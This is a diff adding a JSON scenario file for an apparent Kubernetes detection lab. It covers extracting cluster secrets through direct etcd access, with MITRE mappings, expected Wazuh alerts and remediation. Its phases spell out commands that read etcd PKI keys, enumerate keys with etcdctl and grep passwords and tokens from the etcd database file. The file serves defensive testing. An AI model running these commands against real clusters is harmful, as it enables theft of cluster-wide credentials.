@@ -1,0 +1,204 @@
+{
+  "id": "S6-05",
+  "name": "Kubernetes etcd Direct Access - Cluster Secret Extraction",
+  "category": "Infrastructure",
+  "version": "1.0",
+  "description": "Directly access the etcd datastore to bypass all Kubernetes RBAC and extract every secret in the cluster. etcd contains all K8s state including secrets, configmaps, and service account tokens in plaintext.",
+  "difficulty": "Hard",
+  "real_world_relevance": "Exposed etcd ports (2379/2380), compromised control plane nodes, TeamTNT campaigns targeting etcd. Microsoft 2023 Kubernetes threat matrix lists etcd access as critical path.",
+
+  "mitre_attack": {
+    "tactics": ["Credential Access", "Privilege Escalation"],
+    "techniques": [
+      {"id": "T1552.007", "name": "Unsecured Credentials: Container API"},
+      {"id": "T1611", "name": "Escape to Host"}
+    ]
+  },
+
+  "prerequisites": {
+    "containers": ["k8s-node"],
+    "network": "k8s_net",
+    "permissions": "Access to etcd data directory or etcd API (port 2379)"
+  },
+
+  "attack_flow": {
+    "description": "Attacker accesses etcd directly to bypass all RBAC controls and extract cluster-wide secrets",
+    "diagram": [
+      "1. Attacker gains access to control plane node or etcd endpoint",
+      "2. Attacker reads etcd certificates from /etc/kubernetes/pki/etcd/",
+      "3. Attacker connects to etcd API on port 2379",
+      "4. Attacker lists all keys: etcdctl get / --prefix --keys-only",
+      "5. Attacker extracts secrets: etcdctl get /registry/secrets/",
+      "6. Attacker decodes base64-encoded Kubernetes secrets"
+    ]
+  },
+
+  "phases": [
+    {
+      "name": "etcd Discovery",
+      "description": "Locate etcd data directory and API endpoint",
+      "actions": [
+        {
+          "type": "command",
+          "command": "ls -la /var/lib/etcd/ 2>/dev/null || echo 'etcd data directory not accessible'",
+          "expected_output_contains": ["member"]
+        },
+        {
+          "type": "command",
+          "command": "ss -tlnp | grep -E '2379|2380' 2>/dev/null || echo 'etcd ports not listening'",
+          "description": "Check for etcd API port (2379) and peer port (2380)"
+        },
+        {
+          "type": "command",
+          "command": "ps aux | grep etcd | grep -v grep 2>/dev/null || echo 'etcd process not found'",
+          "description": "Find etcd process and its flags"
+        }
+      ]
+    },
+    {
+      "name": "Certificate Theft",
+      "description": "Steal etcd client certificates for authenticated access",
+      "actions": [
+        {
+          "type": "command",
+          "command": "ls -la /etc/kubernetes/pki/etcd/ 2>/dev/null || echo 'No etcd PKI directory'",
+          "description": "Locate etcd PKI material (ca.crt, server.crt, server.key)"
+        },
+        {
+          "type": "command",
+          "command": "cat /etc/kubernetes/manifests/etcd.yaml 2>/dev/null | grep -A2 'cert-file\\|key-file\\|trusted-ca' || echo 'No etcd manifest'",
+          "description": "Extract certificate paths from etcd static pod manifest"
+        }
+      ]
+    },
+    {
+      "name": "Key Enumeration",
+      "description": "List all keys stored in etcd to discover secrets",
+      "actions": [
+        {
+          "type": "command",
+          "command": "echo 'Would run: etcdctl --endpoints=https://127.0.0.1:2379 --cacert=/etc/kubernetes/pki/etcd/ca.crt --cert=/etc/kubernetes/pki/etcd/server.crt --key=/etc/kubernetes/pki/etcd/server.key get / --prefix --keys-only | head -50'",
+          "description": "Enumerate all etcd keys"
+        }
+      ]
+    },
+    {
+      "name": "Secret Extraction",
+      "description": "Extract all Kubernetes secrets from etcd",
+      "critical": true,
+      "actions": [
+        {
+          "type": "command",
+          "command": "echo 'Would run: etcdctl get /registry/secrets --prefix | strings | grep -E \"password|token|key|secret\" | head -20'",
+          "description": "Extract and filter secrets from etcd registry"
+        }
+      ]
+    },
+    {
+      "name": "Direct Data File Access",
+      "description": "Read etcd data files directly if API is unavailable",
+      "actions": [
+        {
+          "type": "command",
+          "command": "strings /var/lib/etcd/member/snap/db 2>/dev/null | grep -E 'password|token|secret|AKIA' | head -10 || echo 'Cannot read etcd db directly'",
+          "description": "Extract secrets from etcd snapshot database file"
+        }
+      ]
+    }
+  ],
+
+  "indicators_of_compromise": [
+    {
+      "type": "File Access",
+      "description": "Access to /var/lib/etcd directory",
+      "wazuh_rule": "100756"
+    },
+    {
+      "type": "Network",
+      "description": "Connection to etcd API port 2379",
+      "wazuh_rule": "100764"
+    },
+    {
+      "type": "File Access",
+      "description": "Access to K8s PKI certificates",
+      "wazuh_rule": "100751"
+    }
+  ],
+
+  "expected_wazuh_alerts": [
+    {
+      "rule_id": "100756",
+      "level": 14,
+      "description": "NHI: Direct etcd datastore access - CRITICAL"
+    },
+    {
+      "rule_id": "100764",
+      "level": 10,
+      "description": "NHI: Direct Kubernetes API/Kubelet access from container"
+    },
+    {
+      "rule_id": "100955",
+      "level": 15,
+      "description": "NHI: Multi-technique container escape chain"
+    }
+  ],
+
+  "remediation": {
+    "immediate": [
+      "Rotate all Kubernetes secrets in the cluster",
+      "Rotate etcd PKI certificates",
+      "Audit etcd access logs",
+      "Block port 2379/2380 from non-control-plane nodes"
+    ],
+    "long_term": [
+      "Enable etcd encryption at rest (EncryptionConfiguration)",
+      "Restrict etcd access to control plane components only",
+      "Use firewall rules to block etcd ports from worker nodes",
+      "Enable Kubernetes audit logging for all secret access",
+      "Use KMS provider for envelope encryption of secrets"
+    ],
+    "encryption_config_example": {
+      "apiVersion": "apiserver.config.k8s.io/v1",
+      "kind": "EncryptionConfiguration",
+      "resources": [{
+        "resources": ["secrets"],
+        "providers": [
+          {"aescbc": {"keys": [{"name": "key1", "secret": "<base64-encoded-key>"}]}},
+          {"identity": {}}
+        ]
+      }]
+    }
+  },
+
+  "demo_script": {
+    "container": "k8s-node",
+    "commands": [
+      "# Step 1: Check etcd accessibility",
+      "ls -la /var/lib/etcd/ 2>/dev/null || echo 'etcd directory not mounted'",
+      "",
+      "# Step 2: Check for etcd PKI material",
+      "ls /etc/kubernetes/pki/etcd/ 2>/dev/null || echo 'No etcd PKI directory'",
+      "",
+      "# Step 3: Simulate etcd key listing",
+      "echo 'Would run: etcdctl get /registry/secrets --prefix --keys-only'",
+      "",
+      "# Step 4: Check for direct db file access",
+      "ls -la /var/lib/etcd/member/snap/ 2>/dev/null || echo 'No etcd snapshot files'"
+    ]
+  },
+
+  "references": [
+    {
+      "title": "Kubernetes etcd Encryption at Rest",
+      "url": "https://kubernetes.io/docs/tasks/administer-cluster/encrypt-data/"
+    },
+    {
+      "title": "MITRE ATT&CK T1552.007 - Container API",
+      "url": "https://attack.mitre.org/techniques/T1552/007/"
+    },
+    {
+      "title": "Microsoft Kubernetes Threat Matrix",
+      "url": "https://microsoft.github.io/Threat-Matrix-for-Kubernetes/"
+    }
+  ]
+}
